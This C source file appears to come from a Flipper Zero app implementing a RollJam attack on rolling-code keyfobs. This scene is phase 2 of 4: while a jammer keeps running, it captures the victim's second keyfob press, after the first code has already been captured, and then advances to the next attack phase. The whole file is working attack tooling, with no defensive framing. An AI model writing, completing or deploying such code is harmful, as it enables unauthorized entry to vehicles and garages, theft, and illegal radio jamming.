#include "rolljam_scene.h"
#include "../helpers/rolljam_cc1101_ext.h"
#include "../helpers/rolljam_receiver.h"

// ============================================================
// Phase 2: JAM + CAPTURE second keyfob press
// ============================================================

static void phase2_timer_callback(void* context) {
    RollJamApp* app = context;

    if(app->signal_second.size >= 20 &&
       rolljam_signal_is_valid(&app->signal_second)) {
        view_dispatcher_send_custom_event(
            app->view_dispatcher, RollJamEventSignalCaptured);
    }
}

void rolljam_scene_attack_phase2_on_enter(void* context) {
    RollJamApp* app = context;

    widget_reset(app->widget);
    widget_add_string_element(
        app->widget, 64, 2, AlignCenter, AlignTop,
        FontPrimary, "PHASE 2 / 4");
    widget_add_string_element(
        app->widget, 64, 16, AlignCenter, AlignTop,
        FontSecondary, "1st code CAPTURED!");
    widget_add_string_element(
        app->widget, 64, 28, AlignCenter, AlignTop,
        FontSecondary, "Still jamming...");
    widget_add_string_element(
        app->widget, 64, 42, AlignCenter, AlignTop,
        FontPrimary, "PRESS KEYFOB AGAIN");
    widget_add_string_element(
        app->widget, 64, 56, AlignCenter, AlignTop,
        FontSecondary, "[BACK] cancel");

    view_dispatcher_switch_to_view(app->view_dispatcher, RollJamViewWidget);

    memset(app->signal_second.data, 0, sizeof(app->signal_second.data));
    app->signal_second.size  = 0;
    app->signal_second.valid = false;

    rolljam_capture_stop(app);
    furi_delay_ms(50);
    rolljam_capture_start(app);

    notification_message(app->notification, &sequence_blink_yellow_100);

    FuriTimer* timer = furi_timer_alloc(
        phase2_timer_callback, FuriTimerTypePeriodic, app);
    furi_timer_start(timer, 300);

    scene_manager_set_scene_state(
        app->scene_manager, RollJamSceneAttackPhase2, (uint32_t)timer);

    FURI_LOG_I(TAG, "Phase2: waiting for 2nd keyfob press...");
}

bool rolljam_scene_attack_phase2_on_event(void* context, SceneManagerEvent event) {
    RollJamApp* app = context;

    if(event.type == SceneManagerEventTypeCustom) {
        if(event.event == RollJamEventSignalCaptured) {
            rolljam_capture_stop(app);

            if(!rolljam_signal_is_valid(&app->signal_second)) {
                FURI_LOG_W(TAG, "Phase2: false capture, restarting RX...");
                app->signal_second.size  = 0;
                app->signal_second.valid = false;
                furi_delay_ms(50);
                rolljam_capture_start(app);
                return true;
            }

            rolljam_signal_cleanup(&app->signal_second);
            app->signal_second.valid = true;

            notification_message(app->notification, &sequence_success);
            FURI_LOG_I(TAG, "Phase2: 2nd signal captured! size=%d",
                       (int)app->signal_second.size);

            rolljam_capture_stop(app);
            scene_manager_next_scene(app->scene_manager, RollJamSceneAttackPhase3);
            return true;
        }
    } else if(event.type == SceneManagerEventTypeBack) {
        FURI_LOG_I(TAG, "Phase2: cancelled");
        rolljam_capture_stop(app);
        rolljam_jammer_stop(app);
        scene_manager_search_and_switch_to_another_scene(
            app->scene_manager, RollJamSceneMenu);
        return true;
    }
    return false;
}

void rolljam_scene_attack_phase2_on_exit(void* context) {
    RollJamApp* app = context;

    FuriTimer* timer = (FuriTimer*)scene_manager_get_scene_state(
        app->scene_manager, RollJamSceneAttackPhase2);
    if(timer) {
        furi_timer_stop(timer);
        furi_timer_free(timer);
    }

    widget_reset(app->widget);
}
